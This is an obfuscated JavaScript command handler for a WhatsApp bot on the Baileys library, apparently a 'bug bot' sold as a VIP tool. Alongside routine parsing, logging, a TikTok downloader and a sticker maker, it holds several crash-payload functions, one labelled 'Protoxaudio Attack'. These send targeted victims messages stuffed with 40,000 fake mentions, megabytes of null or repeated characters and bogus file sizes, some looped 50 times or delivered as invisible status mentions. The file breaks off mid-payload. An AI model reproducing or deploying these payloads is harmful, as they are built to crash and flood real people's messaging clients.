require("../settings/config");
const {
  default: baileys,
  proto,
  jidNormalizedUser,
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType,
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const {
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  makeInMemoryStore,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediariyuInfo,
  URL_REGEWAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisriyuectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const os = require("os");
const axios = require("axios");
const fsx = require("fs-extra");
const crypto = require("crypto");
const ffmpeg = require("fluent-ffmpeg");
const sharp = require("sharp");
const jimp = require("jimp");
const moment = require("moment-timezone");
const {
  smsg,
  tanggal,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
  generateProfilePicture
} = require("../system/storage");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  addExif
} = require("../system/exif.js");
const babi = fs.readFileSync("./system/image/Hot.jpeg");
module.exports = client = async (_0x23b0c8, _0x3d7bad, _0x58b35b, _0xc24753) => {
  const {
    from: _0x2be1e3
  } = _0x3d7bad;
  try {
    const _0x190e7c = _0x3d7bad.mtype === "conversation" ? _0x3d7bad.message.conversation : _0x3d7bad.mtype === "extendedTextMessage" ? _0x3d7bad.message.extendedTextMessage.text : _0x3d7bad.mtype === "imageMessage" ? _0x3d7bad.message.imageMessage.caption : _0x3d7bad.mtype === "videoMessage" ? _0x3d7bad.message.videoMessage.caption : _0x3d7bad.mtype === "documentMessage" ? _0x3d7bad.message.documentMessage.caption || "" : _0x3d7bad.mtype === "audioMessage" ? _0x3d7bad.message.audioMessage.caption || "" : _0x3d7bad.mtype === "stickerMessage" ? _0x3d7bad.message.stickerMessage.caption || "" : _0x3d7bad.mtype === "buttonsResponseMessage" ? _0x3d7bad.message.buttonsResponseMessage.selectedButtonId : _0x3d7bad.mtype === "listResponseMessage" ? _0x3d7bad.message.listResponseMessage.singleSelectReply.selectedRowId : _0x3d7bad.mtype === "templateButtonReplyMessage" ? _0x3d7bad.message.templateButtonReplyMessage.selectedId : _0x3d7bad.mtype === "interactiveResponseMessage" ? JSON.parse(_0x3d7bad.msg.nativeFlowResponseMessage.paramsJson).id : _0x3d7bad.mtype === "messageContextInfo" ? _0x3d7bad.message.buttonsResponseMessage?.selectedButtonId || _0x3d7bad.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x3d7bad.text : _0x3d7bad.mtype === "reactionMessage" ? _0x3d7bad.message.reactionMessage.text : _0x3d7bad.mtype === "contactMessage" ? _0x3d7bad.message.contactMessage.displayName : _0x3d7bad.mtype === "contactsArrayMessage" ? _0x3d7bad.message.contactsArrayMessage.contacts.map(_0x34e266 => _0x34e266.displayName).join(", ") : _0x3d7bad.mtype === "locationMessage" ? _0x3d7bad.message.locationMessage.degreesLatitude + ", " + _0x3d7bad.message.locationMessage.degreesLongitude : _0x3d7bad.mtype === "liveLocationMessage" ? _0x3d7bad.message.liveLocationMessage.degreesLatitude + ", " + _0x3d7bad.message.liveLocationMessage.degreesLongitude : _0x3d7bad.mtype === "pollCreationMessage" ? _0x3d7bad.message.pollCreationMessage.name : _0x3d7bad.mtype === "pollUpdateMessage" ? _0x3d7bad.message.pollUpdateMessage.name : _0x3d7bad.mtype === "groupInviteMessage" ? _0x3d7bad.message.groupInviteMessage.groupJid : _0x3d7bad.mtype === "viewOnceMessage" ? _0x3d7bad.message.viewOnceMessage.message.imageMessage?.caption || _0x3d7bad.message.viewOnceMessage.message.videoMessage?.caption || "[Pesan sekali lihat]" : _0x3d7bad.mtype === "viewOnceMessageV2" ? _0x3d7bad.message.viewOnceMessageV2.message.imageMessage?.caption || _0x3d7bad.message.viewOnceMessageV2.message.videoMessage?.caption || "[Pesan sekali lihat]" : _0x3d7bad.mtype === "viewOnceMessageV2Extension" ? _0x3d7bad.message.viewOnceMessageV2Extension.message.imageMessage?.caption || _0x3d7bad.message.viewOnceMessageV2Extension.message.videoMessage?.caption || "[Pesan sekali lihat]" : _0x3d7bad.mtype === "ephemeralMessage" ? _0x3d7bad.message.ephemeralMessage.message.conversation || _0x3d7bad.message.ephemeralMessage.message.extendedTextMessage?.text || "[Pesan sementara]" : _0x3d7bad.mtype === "interactiveMessage" ? "[Pesan interaktif]" : _0x3d7bad.mtype === "protocolMessage" ? "[Pesan telah dihapus]" : "";
    const _0x57cc40 = typeof _0x3d7bad.text == "string" ? _0x3d7bad.text : "";
    const _0x7583df = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x190e7c) ? _0x190e7c.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
    const _0x58cce0 = JSON.parse(fs.readFileSync("./system/owner.json"));
    const _0x43d625 = JSON.parse(fs.readFileSync("./system/premium.json"));
    const _0x5ae2d3 = _0x190e7c.startsWith(_0x7583df);
    const _0x5cb20e = _0x190e7c.startsWith(_0x7583df) ? _0x190e7c.slice(_0x7583df.length).trim().split(" ").shift().toLowerCase() : "";
    const _0x16fcad = _0x190e7c.trim().split(/ +/).slice(1);
    const _0x5d40d5 = await _0x23b0c8.decodeJid(_0x23b0c8.user.id);
    const _0x350a35 = [_0x5d40d5, ..._0x58cce0].map(_0x16cd2b => _0x16cd2b.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x3d7bad.sender);
    const _0x84e1a6 = _0x58cce0.map(_0x1a0689 => _0x1a0689.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x3d7bad.sender);
    const _0x2dadea = [_0x5d40d5, ..._0x43d625].map(_0x59f7ac => _0x59f7ac.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x3d7bad.sender);
    const _0x2790a1 = q = _0x16fcad.join(" ");
    const _0x3bb00c = _0x3d7bad.quoted ? _0x3d7bad.quoted : _0x3d7bad;
    const _0x216ac0 = mek.key.remoteJid;
    const {
      spawn: _0x5d1f36,
      exec: _0x5d9460
    } = require("child_process");
    const _0x3bdd14 = _0x3d7bad.isGroup ? _0x3d7bad.key.participant ? _0x3d7bad.key.participant : _0x3d7bad.participant : _0x3d7bad.key.remoteJid;
    const _0x5a8751 = _0x3d7bad.isGroup ? await _0x23b0c8.groupMetadata(_0x216ac0).catch(_0x1ec75b => {}) : "";
    const _0x4df683 = _0x3d7bad.isGroup ? await _0x5a8751.participants : "";
    const _0x379516 = _0x3d7bad.isGroup ? await getGroupAdmins(_0x4df683) : "";
    const _0x309bd9 = _0x3d7bad.isGroup ? _0x379516.includes(_0x5d40d5) : false;
    const _0x593511 = _0x3d7bad.isGroup ? _0x379516.includes(_0x3d7bad.sender) : false;
    const _0x375293 = _0x3d7bad.isGroup ? _0x5a8751.subject : "";
    const _0x4094f1 = _0x3d7bad.pushName || "No Name";
    const _0x3d948a = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
    const _0x4d6d3b = (_0x3bb00c.msg || _0x3bb00c).mimetype || "";
    const _0x489102 = new Date().toLocaleDateString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    if (!_0x23b0c8.public) {
      if (!_0x350a35) {
        return;
      }
    }
    if (_0x5cb20e) {
      if (_0x3d7bad.isGroup) {
        console.log(chalk.bgBlue.white.bold("━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━"));
        console.log(chalk.bgHex("#C51077").hex("#ffffff").bold(" 📅 Date : " + _0x489102 + " \n" + (" 🕐 Clock : " + _0x3d948a + " \n") + (" 💬 Message Received : " + _0x5cb20e + " \n") + (" 🌐 Group Name : " + _0x375293 + " \n") + (" 🔑 Group Id : " + _0x3d7bad.chat + " \n") + (" 👤 Recipient : " + _0x5d40d5 + " \n")));
      } else {
        console.log(chalk.bgBlue.white.bold("━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━"));
        console.log(chalk.bgHex("#C51077").hex("#ffffff").bold(" 📅 Date : " + _0x489102 + " \n" + (" 🕐 Clock : " + _0x3d948a + " \n") + (" 💬 Message Received : " + _0x5cb20e + " \n") + (" 🗣️ Sender : " + _0x4094f1 + " \n") + " 🌐 Group Name : No In Group \n 🔑 Group Id : No In Group \n" + (" 👤 Recipient : " + _0x5d40d5 + " \n")));
      }
    }
    async function _0x11e57d(_0x52304e) {
      return new Promise(async (_0x3e3a3b, _0x201da2) => {
        try {
          let _0xb9874d = [];
          function _0x3aee81(_0x247eee) {
            let _0x20e10a = parseInt(_0x247eee);
            return xx(_0x20e10a).toLocaleString().replace(/,/g, ".");
          }
          function _0x1f1ae8(_0x1b8998, _0x4096cc = "en") {
            let _0x8ae86f = new Date(_0x1b8998);
            return _0x8ae86f.toLocaleDateString(_0x4096cc, {
              weekday: "long",
              day: "numeric",
              month: "long",
              year: "numeric",
              hour: "numeric",
              minute: "numeric",
              second: "numeric"
            });
          }
          let _0x511a93 = "https://www.tikwm.com/api/";
          let _0x2281ee = await (await axios.post(_0x511a93, {}, {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "Sec-Ch-Ua": "\"Not)A;Brand\" ;v=\"24\" , \"Chromium\" ;v=\"116\"",
              "Sec-Ch-Ua-Mobile": "?1",
              "Sec-Ch-Ua-Platform": "Android",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
              "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
              "X-Requested-With": "XMLHttpRequest"
            },
            params: {
              url: _0x52304e,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 1
            }
          })).data.data;
          if (_0x2281ee?.duration == 0) {
            _0x2281ee.images.map(_0x30045b => {
              _0xb9874d.push({
                type: "photo",
                url: _0x30045b
              });
            });
          } else {
            _0xb9874d.push({
              type: "watermark",
              url: "https://www.tikwm.com" + _0x2281ee?.wmplay || "/undefined"
            }, {
              type: "nowatermark",
              url: "https://www.tikwm.com" + _0x2281ee?.play || "/undefined"
            }, {
              type: "nowatermark_hd",
              url: "https://www.tikwm.com" + _0x2281ee?.hdplay || "/undefined"
            });
          }
          let _0x583a5d = {
            status: true,
            title: _0x2281ee.title,
            taken_at: _0x1f1ae8(_0x2281ee.create_time).replace("1970", ""),
            region: _0x2281ee.region,
            id: _0x2281ee.id,
            durations: _0x2281ee.duration,
            duration: _0x2281ee.duration + " Seconds",
            cover: "https://www.tikwm.com" + _0x2281ee.cover,
            size_wm: _0x2281ee.wm_size,
            size_nowm: _0x2281ee.size,
            size_nowm_hd: _0x2281ee.hd_size,
            data: _0xb9874d,
            music_info: {
              id: _0x2281ee.music_info.id,
              title: _0x2281ee.music_info.title,
              author: _0x2281ee.music_info.author,
              album: _0x2281ee.music_info.album ? _0x2281ee.music_info.album : null,
              url: "https://www.tikwm.com" + _0x2281ee.music || _0x2281ee.music_info.play
            },
            stats: {
              views: _0x3aee81(_0x2281ee.play_count),
              likes: _0x3aee81(_0x2281ee.digg_count),
              comment: _0x3aee81(_0x2281ee.comment_count),
              share: _0x3aee81(_0x2281ee.share_count),
              download: _0x3aee81(_0x2281ee.download_count)
            },
            author: {
              id: _0x2281ee.author.id,
              fullname: _0x2281ee.author.unique_id,
              nickname: _0x2281ee.author.nickname,
              avatar: "https://www.tikwm.com" + _0x2281ee.author.avatar
            }
          };
          _0x3e3a3b(_0x583a5d);
        } catch (_0x2dc837) {}
      });
    }
    const _0x1710b9 = ["https://ar-hosting.pages.dev/1749804622369.jpg", "https://ar-hosting.pages.dev/1749804621666.jpg", "https://ar-hosting.pages.dev/1749804623210.jpg"];
    const _0xf037c4 = _0x1710b9[Math.floor(Math.random() * _0x1710b9.length)];
    function _0x232672(_0x130973) {
      return "" + Math.floor(Math.random() * 10000) + _0x130973;
    }
    async function _0x679ae3(_0x329e41, _0x6efeb9, _0x2dc7f3) {
      try {
        let _0x49eb95;
        if (_0x329e41.startsWith("data:")) {
          const _0x4da832 = _0x329e41.split(",")[1];
          _0x49eb95 = Buffer.from(_0x4da832, "base64");
        } else {
          const _0x1ec1bd = await axios.get(_0x329e41, {
            responseType: "arraybuffer"
          });
          _0x49eb95 = Buffer.from(_0x1ec1bd.data, "binary");
        }
        const _0x282b69 = await sharp(_0x49eb95).resize(512, 512, {
          fit: "contain",
          background: {
            r: 255,
            g: 255,
            b: 255,
            alpha: 0
          }
        }).webp({
          quality: 70
        }).toBuffer();
        const _0x57eb14 = await addExif(_0x282b69, global.packname, global.author);
        const _0x541223 = _0x232672(".webp");
        fs.writeFileSync(_0x541223, _0x282b69);
        await _0x6efeb9.sendMessage(_0x2dc7f3.chat, {
          sticker: _0x57eb14,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 ",
              body: "𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
              mediaType: 3,
              renderLargerThumbnail: false,
              thumbnailUrl: _0xf037c4,
              sourceUrl: "https://github.com/ryyyawh"
            }
          }
        }, {
          quoted: _0x2dc7f3
        });
        fs.unlinkSync(_0x541223);
      } catch (_0x1542a1) {
        console.error("Error creating sticker:", _0x1542a1);
        _0x2dc7f3.reply("Terjadi kesalahan saat membuat stiker. Coba lagi nanti.");
      }
    }
    const _0x27a06f = _0x56b23a => {
      return "Usage: " + (_0x7583df + _0x5cb20e) + " " + _0x56b23a;
    };
    const _0x1e1d9b = _0x50cf57 => {
      return _0x23b0c8.sendMessage(_0x3d7bad.chat, {
        text: _0x50cf57,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 ",
            body: "𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnailUrl: "https://files.catbox.moe/lsbbn9.jpg"
            sourceUrl: "https://whatsapp.com/channel/0029Vb5UzCV3WHTSossyJS1D"
          }
        }
      }, {
        quoted: _0x52d80c
      });
    };
    const _0x3414f2 = _0x5e7d80 => {
      const _0x47c688 = [{
        buttonId: ".menu",
        buttonText: {
          displayText: "Menu"
        }
      }];
      const _0x34f0cc = {
        image: {
          url: _0xf037c4
        },
        caption: _0x5e7d80,
        footer: "© 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗦𝗮𝗻𝗱𝘆𝗚𝗮𝗻𝗴𝘀𝘁𝗮±",
        buttons: _0x47c688,
        headerType: 6,
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363404564963436@newsletter",
            serverMessageId: null,
            newsletterName: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 "
          },
          mentionedJid: ["13135550002@s.whatsapp.net"]
        },
        viewOnce: true
      };
      return _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x34f0cc, {
        quoted: _0x52d80c
      });
    };
    const _0x52d80c = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "2009",
          thumbnail: babi,
          itemCount: "9999",
          status: "INQUIRY",
          surface: "",
          message: "—!s`Sandy🫀\ncommand from: @" + _0x3d7bad.sender.split("@")[0],
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["120363369514105242@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const _0x63bfaa = _0x3d7bad.pushName || "No Name";
    const _0x349179 = "" + _0x63bfaa;
    async function _0x313e64(_0x2cbba9) {
      const _0x513474 = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
              fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
              fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
              mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
              mimetype: "image/webp",
              directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
              fileLength: {
                low: 0,
                high: 1048576,
                unsigned: true
              },
              mediaKeyTimestamp: {
                low: 1746112211,
                high: 0,
                unsigned: false
              },
              firstFrameLength: 19904,
              firstFrameSidecar: "KN4kQ5pyABRAgA==",
              isAnimated: true,
              contextInfo: {
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593
              },
              stickerSentTs: {
                low: -1939477883,
                high: 406,
                unsigned: false
              },
              isAvatar: false,
              isAiSticker: false,
              isLottie: false
            }
          }
        }
      };
      for (let _0xda100e = 0; _0xda100e < 50; _0xda100e++) {
        const _0x4d4221 = generateWAMessageFromContent(_0x2cbba9, _0x513474, {
          quoted: null,
          timestamp: Date.now()
        });
        await _0x23b0c8.relayMessage(_0x2cbba9, _0x4d4221.message, {
          messageId: _0x4d4221.key.id
        });
      }
    }
    async function _0x133f8e(_0x1beb9c, _0x130129) {
      console.log(chalk.green("Protoxaudio Attack"));
      const _0x535c44 = {
        viewOnceMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
              fileLength: 99999999999,
              seconds: 24,
              ptt: false,
              mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
              fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
              directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1748513902,
              contextInfo: {
                mentionedJid: Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: _0x1beb9c,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                text: "-!s clientzX7" + "ោ៝".repeat(10000),
                forwardedNewsletterMessageInfo: {
                  newsletterName: "TheclientyzyX7",
                  newsletterJid: "120363309802495518@newsletter",
                  serverMessageId: 1
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "5521992999999@s.whatsapp.net"
                },
                nativeFlowResponseMessage: {
                  name: "© -!s reyy",
                  paramsJson: "\0".repeat(999999)
                },
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/octet-stream",
                  fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                  fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                  fileLength: 99999999999,
                  mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                  fileName: "© -!s reyy",
                  mediaKeyTimestamp: 1748420423,
                  directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                }
              }
            }
          }
        }
      };
      const _0x3de68c = generateWAMessageFromContent(_0x1beb9c, _0x535c44, {});
      await _0x23b0c8.relayMessage("status@broadcast", _0x3de68c.message, {
        messageId: _0x3de68c.key.id,
        statusJidList: [_0x1beb9c],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x1beb9c
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x130129) {
        await _0x23b0c8.relayMessage(_0x1beb9c, {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: _0x3de68c.key,
                type: 25
              }
            }
          }
        }, {
          additionalNodes: [{
            tag: "meta",
            attrs: {
              is_status_mention: "clientzX7 - INVISIBLE"
            },
            content: undefined
          }]
        });
      }
    }
    async function _0x2e40ed(_0x52e1c8) {
      try {
        const _0x3ae3c7 = {
          key: {
            remoteJid: "status@broadcast",
            participant: _0x52e1c8,
            fromMe: false
          },
          message: {
            viewOnceMessage: {
              message: {
                requestPaymentMessage: {
                  currencyCodeIso4217: "XXX",
                  amount1000: 999999999,
                  expiryTimestamp: Date.now() + 86400000,
                  requestFrom: "5521992999999@s.whatsapp.net",
                  noteMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/octet-stream",
                      fileSha256: "TGm7yntjlt1nZjJ8wLE/xkuXxYFELupibDkZZD83k8Q=",
                      fileEncSha256: "QUlCoNMgSucbRYWuHe2vzIrSoUaH+py7zePvtaSshqk=",
                      fileLength: "99999999999",
                      mediaKey: "TS0xXvvf6a1p/3WzoCuV/qQ3c2JNbiX2FuunvFWdDcc=",
                      fileName: "© -!s reyyy",
                      mediaKeyTimestamp: "1748420423",
                      directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0",
                      contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                          newsletterName: "TheclientyzyX7",
                          newsletterJid: "120363309802495518@newsletter",
                          serverMessageId: 1
                        },
                        mentionedJid: Array.from({
                          length: 40000
                        }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        businessMessageForwardInfo: {
                          businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                          name: "© -!s clientzX7",
                          paramsJson: "\0".repeat(999999)
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        };
        await _0x23b0c8.relayMessage("status@broadcast", _0x3ae3c7.message, {
          messageId: generateMessageID(),
          statusJidList: [_0x52e1c8],
          additionalAttributes: {
            participant: _0x52e1c8
          }
        });
      } catch (_0x2454cf) {
        console.error("Error:", _0x2454cf);
      }
    }
    async function _0x4a3fac(_0xb14937) {
      const _0x32003f = Array.from({
        length: 40000
      }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net");
      const _0x1987ca = await generateWAMessageFromContent(_0xb14937, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: "⛧ Apollo Athencion ⛧" + "ꦾ".repeat(5000)
              },
              footer: {
                text: ""
              },
              carouselMessage: {
                cards: [{
                  header: {
                    title: "⛧Apollo Athencion⛧",
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                      fileLength: "164089",
                      height: 1,
                      width: 1,
                      mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                      fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                      directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1749258106",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                      scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                      scanLengths: [5657, 38661, 12072, 27792]
                    },
                    hasMediaAttachment: true
                  },
                  body: {
                    text: "⛧Apollo Athencion⛧"
                  },
                  footer: {
                    text: "apollo ©isrey"
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "\n".repeat(10000)
                  }
                }]
              },
              contextInfo: {
                mentionedJid: _0x32003f,
                participant: "0@s.whatsapp.net",
                isGroupMention: true,
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
